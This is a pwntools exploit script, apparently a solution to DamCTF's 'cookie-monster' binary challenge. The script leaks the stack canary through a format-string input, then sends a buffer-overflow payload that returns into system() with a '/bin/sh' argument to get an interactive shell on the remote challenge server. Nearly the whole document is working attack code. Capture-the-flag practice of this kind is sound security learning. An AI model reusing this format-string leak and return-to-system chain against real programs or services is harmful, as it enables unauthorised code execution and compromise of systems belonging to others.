#!/usr/bin/env python3
from pwn import *
'''
DamCTF. Nov 7 21
'''
def start(argv=[], *a, **kw):
    return remote('chals.damctf.xyz', 31312, *a, **kw)

exe = './cookie-monster'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
# available in source
binsh = 0x08048770
system = 0x0804860C
io = start()

io.sendlineafter(b'Enter your name: ', b'%15$p')
io.recvuntil(b'Hello ')
canary_leaked = int(io.recvline()[:-1], 16)
log.info('canary = %#x', canary_leaked)
'''
push   eax
call   0x8048440 <system@plt>
-> get param from stack
'''
payload = flat({
    32: [
        # [ebp-0xc]
        canary_leaked,
        0,
        0,
        0,
        system,
        binsh,
    ]
})
io.sendlineafter(b'What would you like to purchase?\n', payload)
io.interactive()